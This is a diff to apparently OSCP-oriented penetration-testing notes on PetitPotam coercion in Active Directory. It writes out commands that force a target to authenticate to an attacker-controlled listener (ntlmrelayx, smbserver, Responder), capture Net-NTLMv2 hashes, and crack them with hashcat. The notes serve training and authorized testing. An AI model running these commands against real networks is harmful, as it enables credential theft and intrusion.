@@ -34,14 +34,26 @@ python3 PetitPotam.py -d DOMAIN -u lowpriv -p 'Password123!' ATTACKER_IP TARGET_
 **Reference:** [github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam) · [thehacker.recipes — MS-EFSR abuse](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr)
 
 ### PetitPotam for Hash Capture (standalone, no relay)
-When relay is not viable (SMB signing enforced everywhere), use coercion to capture Net-NTLMv2 hashes for offline cracking with Responder instead:
+When relay is not viable (SMB signing enforced everywhere), use coercion to capture Net-NTLMv2 hashes for offline cracking:
 ```bash
-# Terminal 1: start Responder
-responder -I eth0
+# Terminal 1: start a listener to catch the coerced authentication.
+# NOTE: Responder's default mode also POISONS LLMNR/NBT-NS, which is spoofing and banned on the
+# OSCP exam (see EXAM-TIPS.md "Avoid this"). You don't need poisoning here -- coercion tells the
+# target exactly where to authenticate -- so use a plain listener on the exam:
+sudo impacket-ntlmrelayx -t smb://<UNUSED_TARGET> -smb2support     # or just capture:
+sudo impacket-smbserver share . -smb2support
+
+# In labs/engagements where poisoning is in scope, Responder is the usual listener:
+# responder -I eth0
 
 # Terminal 2: coerce the target to authenticate
 python3 PetitPotam.py <ATTACKER_IP> <TARGET_IP>
 ```
+
+> **Coercion vs. spoofing:** forcing a host to authenticate to you (PetitPotam, PrinterBug, DFSCoerce)
+> is *not* spoofing — you are asking the target directly and it is generally fine. Answering a
+> name-resolution broadcast on another host's behalf (Responder/mitm6 poisoning) *is*. Keep the
+> distinction straight; the first is exam-safe, the second is not.
 Responder captures the Net-NTLMv2 hash. Crack with `hashcat -m 5600`. Machine account hashes ($MACHINE@DOMAIN) are typically random and uncrackable, but user-context coercion (e.g., a service running as a domain user) yields crackable hashes.
 
 ---
